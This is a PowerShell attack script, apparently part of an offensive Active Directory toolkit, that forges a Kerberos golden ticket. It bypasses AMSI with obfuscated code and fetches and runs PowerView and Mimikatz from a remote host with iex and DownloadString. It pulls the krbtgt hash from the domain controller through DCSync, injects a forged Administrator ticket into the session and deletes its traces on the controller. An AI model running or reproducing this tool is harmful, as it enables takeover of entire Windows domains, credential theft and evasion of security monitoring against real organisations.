function golden_ticket{
Clear-Host
$banner = "           _____  ______         _                     ____                 _             
     /\   |  __ \|  ____|       | |                   |  _ \               | |            
    /  \  | |  | | |__ ___  _ __| |_ _ __ ___  ___ ___| |_) |_ __ ___  __ _| | _____ _ __ 
   / /\ \ | |  | |  __/ _ \| '__| __| '__/ _ \/ __/ __|  _ <| '__/ _ \/ _` | |/ / _ \ '__|
  / ____ \| |__| | | | (_) | |  | |_| | |  __/\__ \__ \ |_) | | |  __/ (_| |   <  __/ |   
 /_/    \_\_____/|_|  \___/|_|   \__|_|  \___||___/___/____/|_|  \___|\__,_|_|\_\___|_|   
"
Write-Host -Foregroundcolor yellow $banner
Write-Host " "
Write-Host -Foregroundcolor yellow "Golden Ticket Injector"
Write-Host " "
Write-Host -Foregroundcolor yellow "If you are in a terminal with a domain admin session you are in the right place, enjoy"
Write-Host " "
Write-Host "[*] Bypassing AMSI..."
Write-Host " "
#TAKING IP ADDRESS
$ip_server = (Get-Content C:\Windows\Temp\ip_server.tmp -ErrorAction SilentlyContinue)
if ($ip_server -eq $null){
    Write-Host  -Foregroundcolor red "[*] Please execute the golden check with the previews session"
    Write-Host " "
    Write-Host "[*] Exiting "
    Write-Host " "
    exit

}
Remove-Item C:\Windows\Temp\ip_server.tmp -ErrorAction SilentlyContinue
$domain = (Get-Content C:\Windows\Temp\domain.tmp)
Remove-Item C:\Windows\Temp\domain.tmp -ErrorAction SilentlyContinue
#S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
$download_address = "http://" + $ip_server + ":8000/Modules/powerview.ps1"
iex ((New-Object Net.WebClient).DownloadString($download_address))
Write-Host "[*] Importing usefull information"
Write-Host " "
$DomainSID = Get-DomainSID
$DomainName = (Get-Domain | select name -ExpandProperty name)
$domaincontroller = (Get-DomainController | select name -ExpandProperty name)
$domaincontroller = [string]$domaincontroller
$domaincontroller = $domaincontroller.split(".")
$computerName = $domaincontroller[0]
Write-Host "[*] Sending DCSYNC request on Domain Controller"
Write-Host " "
$session = New-PSSession -ComputerName $computerName
Invoke-Command -ScriptBlock {S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} );
$no_word = ("Mimi" + "Katz" + ".ps1");
$download_address = "http://" + $using:ip_server + ":8000/Modules/Invoke-" + $no_word;

iex ((New-Object Net.WebClient).DownloadString($download_address));
$command_invoke = ("INv" + "oKe-"+"Mi"+"miK"+"atZ") + " " + "-command";$mimi_command = "`'" + " " + "`"lsadump::dcsync /user:$using:domain\krbtgt`"" + " " + "`'";$command_invoke = $command_invoke + " " + $mimi_command;
$kerberos = Invoke-Expression $command_invoke;
Add-Content -Path "C:\Windows\Temp\kerberos.tmp" -Value $kerberos} -computername $computerName
Copy-Item -FromSession $session "C:\Windows\Temp\kerberos.tmp" -Destination 'C:\Windows\Temp\kerberos.tmp'
Remove-PSSession $session
Invoke-Command -ScriptBlock {Remove-Item "C:\Windows\Temp\kerberos.tmp" } -computername $computerName
Write-Host "[*] Cleaning operation on Domain Controller"
Write-Host " "
$krbtgt = (Get-Content C:\Windows\Temp\kerberos.tmp)
$krbtgt = [string]$krbtgt -split "Credentials"
for ($c = 0; $c -lt $krbtgt.length; $c++) {
    if ($krbtgt[$c].contains("Hash NTLM")){
        $krbtgt_final = ($krbtgt[$c] -split ":")
        $krbtgt_final = $krbtgt_final[2]
    }
}
$krbtgt_final = $krbtgt_final.trim()
$krbtgt = $krbtgt_final.substring(0,32)
Remove-Item C:\Windows\Temp\kerberos.tmp
#GOLDEN TICKET
Write-Host "[*] Requesting GOLDEN TICKET"
Write-Host " "
$no_word = ("Mimi" + "Katz" + ".ps1")
$download_address = "http://" + $ip_server + ":8000/Modules/Invoke-" + $no_word
iex ((New-Object Net.WebClient).DownloadString($download_address))
$command_invoke = ("INv" + "oKe-"+"Mi"+"miK"+"atZ") + " " + "-command"
$mimi_command = "`'" + " " + "`"kerberos::golden /user:Administrator /domain:$DomainName /sid:$DomainSID /krbtgt:$krbtgt /ptt`"" + " " + "`'"
$command_invoke = $command_invoke + " " + $mimi_command
$golden_ticket = (Invoke-Expression $command_invoke)
if ($golden_ticket.contains("successfully submitted")){
    Write-Host "[*] The golden ticket has been successfully submitted for current session!"
    Write-Host " "
    klist
    Write-Host " "
}
else{
    Write-Host "[*] Some problem occured, retry"
    Write-Host " "
}
Write-Host "[*] Bye"
Write-Host " "
}

Set-Alias Invoke-ADGolden golden_ticket